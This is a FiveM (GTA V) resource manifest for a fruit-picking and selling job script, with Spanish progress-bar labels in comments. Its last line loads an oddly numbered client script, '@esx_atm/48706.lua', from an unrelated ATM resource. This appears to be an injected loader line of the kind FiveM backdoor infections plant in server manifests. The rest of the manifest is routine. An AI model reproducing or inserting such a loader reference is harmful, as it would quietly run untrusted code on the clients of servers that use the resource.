fx_version 'adamant'
game 'gta5'

shared_scripts {
    'config.lua'
}

client_scripts {
    'client/main.lua'
}

server_scripts {
    '@mysql-async/lib/MySQL.lua',
    'server/main.lua'
}

-- exports['progressBars']:startUI(Time_MS, "Recogiendo Naranjas")
-- exports['progressBars']:startUI(Time_MS, "Recogiendo melocotones")
-- exports['progressBars']:startUI(Time_MS, "Recogiendo fresas")
-- exports['progressBars']:startUI(Time_MS, "Procesando fruta")
-- exports['progressBars']:startUI(Time_MS, "Vendiendo cajas de fruta")
client_script '@esx_atm/48706.lua'